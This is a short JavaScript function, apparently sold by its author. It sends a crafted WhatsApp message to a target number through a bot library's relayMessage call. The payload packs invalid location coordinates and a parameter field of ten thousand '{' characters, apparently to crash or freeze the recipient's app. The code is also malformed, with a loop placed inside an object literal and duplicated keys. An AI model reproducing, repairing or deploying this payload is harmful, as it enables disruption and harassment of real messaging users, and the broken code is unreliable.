//THANKS FOR BUYING CREATED BY VAXZYOFFICIAL NOTE: NO SHARE FREE FUNC EROR? LAPOR KE @vaacantivv

async function VerloadForceX(target) {
try {
    let message = {
      viewOneMessage: {
        message: {
         interactiveMessage: {
           header: {
            title: "-VaxzyNotFound🐉",
             hasMediaAttachment: false,
             locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "-VaxzyNotFound🐉",
                address: "-VaxzyNotFound🐉",
               },
              },
              body: {
               text: "-VaxzyNotFound🐉",
              },
              contextInfo: {
                  participant: "0@s.whatsapp.net",
                  remoteJid: "X",
                  mentionedJid: ["0@s.whatsapp.net"]
                },
                body: {
                  text: "-VaxzyNotFound🐉",
                },
    for (let r = 0; r < 1; r++) {
                nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await Verload.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}